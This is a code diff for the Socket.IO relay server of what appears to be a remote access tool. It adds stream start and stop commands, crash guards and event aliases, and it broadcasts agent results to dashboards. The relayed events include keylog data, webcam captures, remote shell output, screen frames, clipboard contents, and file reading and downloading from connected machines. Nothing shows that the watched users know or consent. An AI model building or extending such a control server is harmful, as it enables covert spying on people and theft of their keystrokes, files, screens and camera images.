@@ -961,6 +961,8 @@ if SOCKETIO_OK and sio:
             leave_room(f"view:{old_did}")
             with _view_lock:
                 _viewers[old_did].discard(request.sid)
+            # Tell agent to stop sending to the old device
+            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": old_did}, room=old_did)
             log.info(f"Dashboard {request.sid} left stream for {old_did}")
 
         room = f"view:{did}"
@@ -972,6 +974,26 @@ if SOCKETIO_OK and sio:
         viewer_count = len(_viewers[did])
         log.info(f"Dashboard {request.sid} subscribed to {did} (viewers: {viewer_count})")
         emit("subscribed", {"device_id": did, "viewers": viewer_count})
+
+        # Tell the agent to START streaming now that someone is watching.
+        # dashboard_command with tab:monitor,action:start is the canonical way.
+        fps     = data.get("fps", 15)
+        quality = data.get("quality", 55)
+        scale   = data.get("scale", 0.8)
+        monitor = data.get("monitor", 1)
+        with _dev_lock:
+            dev = _devices.get(did)
+        if dev:
+            sio.emit("request_action", {
+                "tab":       "monitor",
+                "action":    "start",
+                "device_id": did,
+                "fps":       fps,
+                "quality":   quality,
+                "scale":     scale,
+                "monitor":   monitor,
+            }, room=did)
+            log.info(f"Stream start sent to agent {did} (fps={fps}, quality={quality})")
 
     @sio.on("unsubscribe_stream")
     def on_unsubscribe_stream(data):
@@ -990,6 +1012,12 @@ if SOCKETIO_OK and sio:
     # ── Agent registration ────────────────────────────────────────────────────
     @sio.on("agent_connect")
     def on_agent_connect(data):
+        try:
+            _handle_agent_connect(data)
+        except Exception as exc:
+            log.error(f"agent_connect crash (sid={request.sid}): {exc}", exc_info=True)
+
+    def _handle_agent_connect(data):
         did   = data.get("device_id") or data.get("token", "")
         label = data.get("label") or data.get("hostname") or did
 
@@ -1062,7 +1090,7 @@ if SOCKETIO_OK and sio:
         # Only notify dashboards watching this specific device
         sio.emit("heartbeat_update", data, room=f"view:{did}")
         # Also broadcast globally (low frequency, for device list updates)
-        sio.emit("heartbeat_update", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("heartbeat_update", data, room="dashboards")
 
     # ── Screen data relay — ISOLATED per device ───────────────────────────────
     @sio.on("screen_data")
@@ -1071,6 +1099,12 @@ if SOCKETIO_OK and sio:
         CRITICAL FIX: frames are only sent to the 'view:{device_id}' room.
         Multiple machines cannot cross-contaminate each other's streams.
         """
+        try:
+            _relay_screen_data(data)
+        except Exception as exc:
+            log.error(f"screen_data relay crash: {exc}", exc_info=True)
+
+    def _relay_screen_data(data):
         did      = data.get("device_id", "")
         frame_b64 = data.get("frame") or data.get("image", "")
 
@@ -1087,20 +1121,27 @@ if SOCKETIO_OK and sio:
         with _frame_stats_lock:
             _frame_stats[did].append((time.time(), frame_bytes))
 
-        # Emit ONLY to viewers of this specific device
+        # Emit ONLY to viewers of this specific device.
+        # Emit under MULTIPLE event names so any dashboard listener variant catches it.
         relay = dict(data)
         relay["_relayed"] = True
         relay["ts_relay"] = utcnow()
-        sio.emit("screen_data", relay, room=f"view:{did}")
+        view_room = f"view:{did}"
+        sio.emit("screen_data",   relay, room=view_room)   # primary
+        sio.emit("screen_frame",  relay, room=view_room)   # dashboard alias 1
+        sio.emit("frame",         relay, room=view_room)   # dashboard alias 2
 
         # ACK back to the agent so it knows it can send the next frame
         with _dev_lock:
             frame_num = _devices.get(did, {}).get("frame_count", 0)
-        sio.emit("frame_ack", {
-            "device_id": did,
-            "frame_num": frame_num,
-            "ts":        utcnow(),
-        }, room=request.sid)
+        try:
+            sio.emit("frame_ack", {
+                "device_id": did,
+                "frame_num": frame_num,
+                "ts":        utcnow(),
+            }, room=request.sid)
+        except Exception:
+            pass  # ACK failure must never crash the relay
 
     @sio.on("screenshot_result")
     def on_screenshot_result(data):
@@ -1118,7 +1159,7 @@ if SOCKETIO_OK and sio:
     def on_ping_result(data):
         did = data.get("device_id", "")
         sio.emit("pong_agent", data, room=f"view:{did}")
-        sio.emit("pong_agent", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("pong_agent", data, room="dashboards")
 
     @sio.on("cursor_event")
     def on_cursor(data):
@@ -1131,13 +1172,13 @@ if SOCKETIO_OK and sio:
     def _r_system(data):
         did = data.get("device_id", "")
         sio.emit("update_system_tab", data, room=f"view:{did}")
-        sio.emit("update_system_tab", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("update_system_tab", data, room="dashboards")
 
     @sio.on("processes_report")
     def _r_procs(data):
         did = data.get("device_id", "")
         sio.emit("processes_result", data, room=f"view:{did}")
-        sio.emit("processes_result", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("processes_result", data, room="dashboards")
 
     @sio.on("kill_result")
     def _r_kill(data):
@@ -1153,7 +1194,7 @@ if SOCKETIO_OK and sio:
     def _r_shell(data):
         did = data.get("device_id", "")
         sio.emit("shell_result", data, room=f"view:{did}")
-        sio.emit("shell_result", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("shell_result", data, room="dashboards")
 
     @sio.on("file_list_result")
     def _r_flist(data):
@@ -1165,19 +1206,19 @@ if SOCKETIO_OK and sio:
         # Find which dashboard requested this — route to view room
         sio.emit("file_list_result", data, room=f"view:{did}")
         # Also send to all dashboards for backwards compat (they filter by device_id)
-        sio.emit("file_list_result", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("file_list_result", data, room="dashboards")
 
     @sio.on("file_read_result")
     def _r_fread(data):
         did = data.get("device_id", "")
         sio.emit("file_read_result", data, room=f"view:{did}")
-        sio.emit("file_read_result", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("file_read_result", data, room="dashboards")
 
     @sio.on("file_download_result")
     def _r_fdl(data):
         did = data.get("device_id", "")
         sio.emit("file_download_result", data, room=f"view:{did}")
-        sio.emit("file_download_result", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("file_download_result", data, room="dashboards")
 
     @sio.on("file_delete_result")
     def _r_fdel(data):
@@ -1188,25 +1229,25 @@ if SOCKETIO_OK and sio:
     def _r_drives(data):
         did = data.get("device_id", "")
         sio.emit("drives_report", data, room=f"view:{did}")
-        sio.emit("drives_report", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("drives_report", data, room="dashboards")
 
     @sio.on("disks_report")
     def _r_disks(data):
         did = data.get("device_id", "")
         sio.emit("disks_report", data, room=f"view:{did}")
-        sio.emit("disks_report", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("disks_report", data, room="dashboards")
 
     @sio.on("network_report")
     def _r_net(data):
         did = data.get("device_id", "")
         sio.emit("network_report", data, room=f"view:{did}")
-        sio.emit("network_report", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("network_report", data, room="dashboards")
 
     @sio.on("webcam_result")
     def _r_webcam(data):
         did = data.get("device_id", "")
         sio.emit("webcam_result", data, room=f"view:{did}")
-        sio.emit("webcam_result", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("webcam_result", data, room="dashboards")
 
     @sio.on("webcam_list_result")
     def _r_wcam_list(data):
@@ -1217,7 +1258,7 @@ if SOCKETIO_OK and sio:
     def _r_keylog(data):
         did = data.get("device_id", "")
         sio.emit("keylog_data", data, room=f"view:{did}")
-        sio.emit("keylog_data", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("keylog_data", data, room="dashboards")
 
     @sio.on("clipboard_data")
     def _r_clip(data):
@@ -1228,7 +1269,7 @@ if SOCKETIO_OK and sio:
     def _r_clip_result(data):
         did = data.get("device_id", "")
         sio.emit("clipboard_result", data, room=f"view:{did}")
-        sio.emit("clipboard_result", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("clipboard_result", data, room="dashboards")
 
     @sio.on("clipboard_set_result")
     def _r_clip_set(data):
@@ -1239,7 +1280,7 @@ if SOCKETIO_OK and sio:
     def _r_action(data):
         did = data.get("device_id", "")
         sio.emit("action_result", data, room=f"view:{did}")
-        sio.emit("action_result", data, room="dashboards", skip_sid=request.sid)
+        sio.emit("action_result", data, room="dashboards")
 
     @sio.on("stream_stats")
     def _r_stream_stats(data):
